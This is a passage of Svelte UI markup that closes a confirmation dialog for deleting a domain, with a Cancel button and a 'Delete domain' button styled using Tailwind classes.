					onclick={() => (confirmDeleteDomain = null)}
					class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]"
				>
					Cancel
				</button>
				<button
					onclick={performDeleteDomain}
					class="rounded-lg bg-[var(--destructive)] px-4 py-2 text-sm font-medium text-white transition-soft hover:opacity-90"
				>
					Delete domain
				</button>
			</div>
		</div>
	</div>
{/if}
